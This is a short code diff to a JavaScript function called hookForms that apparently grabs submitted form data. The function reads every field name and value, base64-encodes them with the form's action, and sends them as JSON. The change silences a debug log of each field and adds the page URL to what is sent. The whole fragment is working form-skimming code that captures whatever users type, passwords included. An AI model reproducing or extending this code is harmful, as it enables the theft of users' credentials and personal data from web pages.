@@ -378,7 +378,7 @@ function hookForms()
 			var formData = new FormData(event.target);
 			for (let [name, value] of formData.entries()) 
 			{
-	        console.log(`${name}: ${value}`);
+	        	//console.log(`${name}: ${value}`);
 				data += name + ": " + value + '\n';
 			}
 
@@ -391,7 +391,8 @@ function hookForms()
 			jsonObj["action"] = btoa(action);
 			jsonObj["method"] = method;
 			jsonObj["data"]   = btoa(data);
-			var jsonString = JSON.stringify(jsonObj);
+			jsonObj["url"]    = myReference.location.href;
+			var jsonString    = JSON.stringify(jsonObj);
 			request.send(jsonString);
 		}
 
